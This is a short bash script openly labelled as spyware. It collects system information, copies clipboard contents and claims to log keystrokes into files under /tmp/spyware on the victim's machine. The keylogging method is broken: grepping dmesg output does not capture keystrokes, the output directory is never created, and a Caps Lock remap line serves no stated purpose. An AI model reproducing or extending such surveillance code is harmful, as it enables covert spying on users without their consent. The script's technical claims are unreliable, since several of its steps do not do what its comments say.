#!/bin/bash

# Variables
TARGET="/tmp/spyware"

# Function to retrieve system information
gather_info() {
    echo "OS: $(cat /etc/issue)" > $TARGET/system_info.txt
    echo "User: $(whoami)" >> $TARGET/system_info.txt
    echo "Date & Time: $(date)" >> $TARGET/system_info.txt
    echo "Disk Usage: $(df -h)" >> $TARGET/system_info.txt
}

# Function to monitor clipboard contents
monitor_clipboard() {
    xclip -o > $TARGET/clipboard.txt &
}

# Function to log keystrokes
log_keystrokes() {
    setxkbmap -option 'ctrl:nocaps' # Remove Caps Lock key from the keylogger
    while true; do
        dmesg -w | grep -i "key 0" >> $TARGET/keystrokes.txt
        sleep 1
    done
}

# Main program flow
gather_info

monitor_clipboard &

log_keystrokes &
